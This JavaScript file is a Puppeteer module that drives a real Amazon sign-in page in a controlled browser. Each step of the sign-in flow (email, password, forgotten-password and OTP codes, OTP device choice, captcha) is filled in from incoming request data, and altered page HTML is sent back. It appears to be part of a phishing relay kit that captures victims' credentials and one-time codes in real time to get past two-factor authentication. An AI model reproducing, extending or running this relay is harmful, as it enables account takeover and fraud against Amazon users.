const { Application } = require("../Application")
const { getHeaders } = require("../headers")

class Amazon extends Application {
    async postRequest(configuration) {
        const browser = await this.connectBrowser()
        const pages = await browser.pages()
        const page = pages[0]
        await page.setExtraHTTPHeaders(getHeaders(this.device))

        const body = configuration.body
        const spikeType = body["spike-type"]
        try {
            if (spikeType == "email") { // email or username
                let email = `[type="email"]`
                await page.waitForSelector(email)

                await page.evaluate(() => {
                    document.querySelector(`[type="email"]`).value = ""
                })

                await page.type(email, body.email)
                await Promise.all([
                    page.click(`[type="submit"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "password") { // password
                let password = `[type="password"]`
                await page.waitForSelector(password)

                await page.type(password, body.password)
                await Promise.all([
                    page.click(`[type="submit"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "forget_password") { // forgetget password button
                let forget_passwordBtn = "#auth-fpp-link-bottom"
                await page.waitForSelector(forget_passwordBtn)

                await Promise.all([
                    page.click(forget_passwordBtn),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "forgetpass_otp_code") { // forget password otp code
                let sel = `[name="code"]`
                await page.waitForSelector(sel)
                await page.type(sel, body.code)

                await Promise.all([
                    page.click(`[type="submit"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "otp_code") { // normal otp code
                let otp_code = `[name="otpCode"]`
                await page.waitForSelector(otp_code)

                await page.type(otp_code, body.otpCode)
                await Promise.all([
                    page.click(`[type="submit"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "resend_otp") { // resend otp code
                let resend_otp_btn = "#auth-get-new-otp-link"
                await page.waitForSelector(resend_otp_btn)

                await Promise.all([
                    page.click(resend_otp_btn),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else if (spikeType == "otp_devices") { // select otp device
                let deviceIndex = body["spike-device-index"]

                await page.evaluate(() => {
                    let allOtpDevices = document.querySelectorAll(`[name="otpDeviceContext"]`)
                    allOtpDevices.forEach((btn, index) => {
                        btn.setAttribute("spike-otp-device", index)
                    })
                })

                await page.waitForSelector(`[spike-otp-device="${deviceIndex}"]`)
                page.click(`[spike-otp-device="${deviceIndex}"]`)

                await Promise.all([
                    page.click(`[type="submit"]`),
                    new Promise(re => setTimeout(re, 4000))
                ])

            } else if (spikeType == "captcha") { // captcha
                let sel = `[name="field-keywords"]`
                await page.waitForSelector(sel)
                await page.type(sel, body["field-keywords"])

                await Promise.all([
                    page.click(`[type="submit"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])

            } else {
                return await this.openTAB(true)
            }

            const html = await page.content()
            let response = this.alterHTML(html, true)
            return response

        } catch (error) {
            console.log(error, "\n::- resetting the page to index")
            return await this.openTAB(true)
        }
    }
}

async function init(reqType, config) {
    const appBrowser = new Amazon(config)
    await appBrowser.openBrowser()

    if (reqType == "getReq") {
        return await appBrowser.openTAB(true)
    } else if (reqType == "postReq") {
        return await appBrowser.postRequest(config)
    }
}

module.exports = {
    init
}